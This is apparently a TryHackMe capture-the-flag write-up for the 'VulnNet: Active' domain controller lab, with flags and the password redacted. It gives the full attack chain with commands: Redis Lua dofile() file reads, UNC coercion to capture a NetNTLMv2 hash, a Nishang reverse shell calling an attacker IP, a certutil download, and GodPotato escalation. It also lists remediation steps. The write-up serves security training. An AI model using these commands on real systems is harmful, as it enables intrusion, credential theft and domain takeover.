# TryHackMe — VulnNet: Active

**Platform:** TryHackMe
**Difficulty:** Medium
**OS:** Windows Server 2019 (Active Directory Domain Controller)
**Domain:** `vulnnet.local`

> **Scope note:** Authorized lab environment only. Flags and credentials are partially redacted. IP addresses shown are ephemeral lab addresses and change on each deploy.

---

## TL;DR

An Active Directory Domain Controller exposes an **unauthenticated Redis 2.8.2402** instance. The Redis service account is leveraged three ways:

1. **Lua `dofile()` file read** — leaks the user flag via a parser error.
2. **Lua `dofile()` on a UNC path** — coerces the DC's SMB client to authenticate outbound to an attacker-controlled listener, capturing a **NetNTLMv2** hash.
3. After cracking, valid domain credentials give write access to a share holding a **scheduled PowerShell script**, which is overwritten with a reverse shell.

Final privilege escalation abuses **`SeImpersonatePrivilege`** via **GodPotato** to reach `NT AUTHORITY\SYSTEM`.

**Kill chain:** unauth Redis → Lua `dofile` UNC coercion → NetNTLMv2 → crack → SMB share script overwrite → foothold shell → GodPotato → SYSTEM

---

## 1. Reconnaissance

```bash
nmap -sCV -O -p- <TARGET_IP>
```

Key results:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS (Simple DNS Plus) | DC indicator |
| 135 / 139 / 445 | RPC / NetBIOS / SMB | SMB signing required |
| 464 | kpasswd5 | Kerberos password change |
| **6379** | **Redis 2.8.2402** | **Unusual on a DC — primary target** |
| 9389 | ADWS (.NET Message Framing) | AD Web Services |

**Filtered (atypical for a DC):** Kerberos 88, LDAP 389/636, WinRM 5985/5986, RDP 3389 — the host firewall restricts most standard AD attack surface, pushing focus onto Redis.

SMB enumeration confirmed the domain but allowed no anonymous share/user listing:

```bash
crackmapexec smb <TARGET_IP>          # domain: vulnnet.local, host VULNNET-BC3TCK1
enum4linux-ng -A <TARGET_IP>          # anon SMB session OK; RPC user/group enum ACCESS_DENIED
```

---

## 2. Redis Enumeration

```bash
sudo apt install redis-tools -y       # redis-cli lives in this package
redis-cli -h <TARGET_IP>
```

```
INFO           # confirms Redis 2.8.2402 on Windows
CONFIG GET *   # no requirepass (no auth); dir = C:\Users\enterprise-security\Downloads\Redis-x64-2.8.2402
KEYS *         # empty keyspace
```

Two findings drive everything downstream:

- **No authentication** (`requirepass` empty).
- The `dir` path reveals the service runs as user **`enterprise-security`**.

---

## 3. User Flag — Lua `dofile()` File Read

Redis exposes Lua scripting via `EVAL`. On this old build, the `dofile()` function is reachable inside the sandbox. `dofile()` tries to *parse and execute* the target file as Lua; when fed non-Lua text, the parser throws an error that **leaks the file's first line**.

```bash
EVAL "return dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
```

```
(error) ... malformed number near '3eb1**********************████████'
```

**User flag:** `THM{3eb1██████████████████████████}`

> **Why it works:** the flag string is interpreted as a malformed Lua numeric literal → the error message echoes the offending token, i.e. the flag content.

The same primitive was used to probe the filesystem. Note `dofile()` only ever leaks the **first line** of a file, and the Lua sandbox here is hardened (`enable_strict_lua`): `io`, `os`, `package`, `loadfile` are all blocked — only `dofile()` is whitelisted.

---

## 4. Hash Capture — `dofile()` UNC Coercion

The critical insight: `dofile()` accepts a **UNC path**. When the Redis process (running as `enterprise-security`) tries to load a file from `\\ATTACKER\share\...`, the **operating system's SMB client** performs an outbound authentication — leaking a **NetNTLMv2** hash to a listener we control.

> This is coercion via the OS SMB client, **not** `CONFIG SET dir` (which only changes a local working directory and does no network I/O), and **not** an SCF file drop.

**Listener** (see Pitfalls — interface selection is critical):

```bash
ip route get <TARGET_IP>        # note the dev + src that route to the target
sudo fuser -k 445/tcp           # free port 445 so Responder can bind SMB
sudo responder -I <dev> -v      # e.g. ens5 — MUST be the dev from ip route get
```

**Trigger:**

```bash
redis-cli -h <TARGET_IP>
EVAL "dofile('//<ATTACKER_SRC_IP>/share/test')" 0
```

Redis replies `Permission denied` / `Connection reset by peer` — **expected and harmless**; the SMB authentication already fired. Responder captures:

```
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:c77b**********:0D97************:0101...
```

---

## 5. Cracking the Hash

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Credentials recovered:** `enterprise-security : sand_████████████`

Validate and enumerate with the new creds:

```bash
crackmapexec smb <TARGET_IP> -u 'enterprise-security' -p '<PASSWORD>' --shares
crackmapexec smb <TARGET_IP> -u 'enterprise-security' -p '<PASSWORD>' --users
```

Shares of interest: **`Enterprise-Share`**. Domain users: `Administrator`, `enterprise-security`, `jack-goldenhand`, `tony-skid`, plus defaults.

---

## 6. Foothold — Scheduled Script Overwrite

`Enterprise-Share` contains:

```
PurgeIrrelevantData_1826.ps1   (rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue)
```

A server-side batch loop executes this script roughly every 60 seconds:

```bat
:home
TIMEOUT /T 30 /NOBREAK
powershell.exe -File C:\Enterprise-Share\PurgeIrrelevantData_1826.ps1
TIMEOUT /T 30
cls
Goto :home
```

Overwriting the script with a reverse shell yields code execution when the loop next fires.

**Payload** (Nishang — more reliable here than msfvenom shells):

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 \
     -O PurgeIrrelevantData_1826.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 443" >> PurgeIrrelevantData_1826.ps1
```

**Listener:**

```bash
sudo rlwrap nc -lvnp 443
```

**Upload via authenticated SMB `put`** (overwrites in place through a normal write handle):

```bash
smbclient //<TARGET_IP>/Enterprise-Share \
  -U 'vulnnet.local/enterprise-security%<PASSWORD>' \
  -c 'put PurgeIrrelevantData_1826.ps1'
```

Within ~60 s, a shell returns as **`vulnnet\enterprise-security`**.

> **Note:** `crackmapexec --shares` mislabels this share as READ, but authenticated `smbclient put` writes successfully. Attempting to overwrite the file via Redis `SAVE` fails (the account can create new files in the directory but not modify this existing one) — SMB `put` is the correct method.

---

## 7. Privilege Escalation — GodPotato → SYSTEM

Post-exploitation recon:

```powershell
whoami /priv
```

```
SeImpersonatePrivilege        Enabled
```

```powershell
Get-Service Spooler                                    # Running
Get-MpComputerStatus | Select RealTimeProtectionEnabled  # False (Defender off)
```

`SeImpersonatePrivilege` + Windows Server 2019 is a textbook **Potato**-family escalation. PrintSpoofer produced no output in this shell; **GodPotato** worked first try by abusing DCOM/RPCSS to steal a SYSTEM token.

**Transfer & execute:**

```powershell
cd C:\Users\enterprise-security\Downloads
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/GodPotato-NET4.exe god.exe
.\god.exe -cmd "cmd /c whoami"                          # -> nt authority\system
.\god.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\system.txt"
```

**System flag:** `THM{d540██████████████████████████}`

---

## Flags

| Flag | Value |
|------|-------|
| User | `THM{3eb1██████████████████████████}` |
| System | `THM{d540██████████████████████████}` |

---

## Lessons Learned

- **Match Responder's interface to the route.** A multi-homed attack box (VPN `tun0` + local `ens5`) will silently drop the captured hash if Responder listens on the wrong NIC. Always resolve `ip route get <target>`, then bind Responder to that `dev` **and** set the coercion UNC to that same `src` IP.
- **Test the right stack for connectivity.** A Redis `SLAVEOF` connectivity test uses the Redis replication stack, not the Windows SMB client — it does not prove whether SMB coercion is firewalled. Don't rule out a vector based on the wrong protocol path.
- **`CONFIG SET dir` ≠ outbound auth.** Only `dofile()` on a UNC path triggers the OS SMB client. Chasing `CONFIG SET dir` or SCF drops wastes time here.
- **Pick the escalation tool that reports.** GodPotato prints verbose diagnostics and is reliable on Server 2019 with `SeImpersonate`. When a tool returns totally silent output (PrintSpoofer here), pivot rather than retry.
- **Old Redis is a file-read + coercion primitive**, not just a data store — even with a hardened Lua sandbox, one whitelisted function (`dofile`) is enough.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port/service discovery |
| redis-cli (redis-tools) | Redis enumeration + Lua `dofile` exploitation |
| Responder | NetNTLMv2 capture |
| hashcat (`-m 5600`) | Offline NetNTLMv2 cracking |
| crackmapexec | Authenticated SMB enumeration |
| smbclient | Share access + payload upload (`put`) |
| Nishang `Invoke-PowerShellTcp` | Reverse shell payload |
| GodPotato | `SeImpersonatePrivilege` → SYSTEM |

---

## Remediation

- **Never expose Redis to untrusted networks**, especially on a Domain Controller. Enforce `requirepass`, bind to loopback, enable protected-mode, and disable/ rename dangerous commands (`EVAL`, `CONFIG`).
- Upgrade Redis to a supported, patched release.
- Run services under **least-privilege** accounts, not accounts with broad interactive/domain rights.
- Restrict outbound SMB (445) from servers to prevent NTLM coercion; consider SMB signing and NTLM hardening.
- Store scheduled-task scripts in locations writable **only** by the executing (privileged) principal; never in a share writable by lower-tier users.
- Patch/monitor for **Potato**-class abuse of `SeImpersonatePrivilege` on service accounts.
